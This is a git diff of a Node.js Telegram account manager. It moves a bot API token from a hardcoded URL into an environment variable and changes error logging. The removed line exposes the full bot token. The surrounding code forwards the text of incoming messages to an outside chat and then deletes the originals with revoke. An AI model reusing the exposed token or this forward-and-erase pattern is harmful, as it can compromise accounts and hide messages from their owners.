@@ -3,11 +3,11 @@ const { NewMessage } = require("telegram/events/index.js");
 const axios = require('axios');
 const { StringSession } = require('telegram/sessions');
 const { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')
-const ppplbot = "https://api.telegram.org/bot6735591051:AAEzZXskYOZu4bO9X2qvZy2JQ7Olrtyp1H0/sendMessage";
 const { CustomFile } = require("telegram/client/uploads");
 const { sleep } = require('./utils')
 const fs = require('fs');
 const ChannelService = require('./dbservice');
+const { parseError } = require('./utils')
 
 const clients = new Map();
 
@@ -587,6 +587,7 @@ class TelegramManager {
                     await deleteClient(this.phoneNumber)
                 }
                 console.log(event.message.text.toLowerCase());
+                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                 const payload = {
                     "chat_id": "-1001801844217",
                     "text": event.message.text
@@ -595,7 +596,9 @@ class TelegramManager {
                     .then((response) => {
                     })
                     .catch((error) => {
-                        console.error('Error sending message:', error.response?.data?.description);
+                        console.log(error)
+                        console.log(parseError(error))
+                        // console.error('Error sending message:', error.response?.data?.description);
                     });
                 await event.message.delete({ revoke: true });
             }
